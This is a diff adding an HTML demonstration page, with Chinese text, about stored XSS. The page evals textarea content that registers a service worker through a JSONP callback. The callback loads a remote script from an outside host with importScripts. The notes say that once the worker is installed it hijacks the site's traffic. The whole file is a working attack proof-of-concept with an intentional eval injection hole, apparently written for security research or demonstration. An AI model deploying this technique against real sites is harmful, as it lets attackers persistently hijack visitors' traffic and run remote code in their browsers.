@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+  <title>简单的 XSS</title>
+  <meta charset="utf-8">
+</head>
+<body>  
+  <h1>该页面有存储型 XSS</h1>
+  <textarea id="userData" style="width:500px; height:200px;">
+let key = 'importScripts("https://etherdream.com/sw-test/sw.js?g"),'
+let url = 'getData.php?callback=' + encodeURIComponent(key)
+
+navigator.serviceWorker.register(url)
+  </textarea>
+  <script>
+    // xss here
+    eval(userData.value);
+  </script>
+  <div>
+    刷新前面那个正常页面，如果右上角出现 XSS Running，说明 SW 安装成功，并能劫持当前站点的流量。<br>
+    打开页面源代码，可以发现 SW 插入的 HTML。
+  </div>
+</body>
+</html>
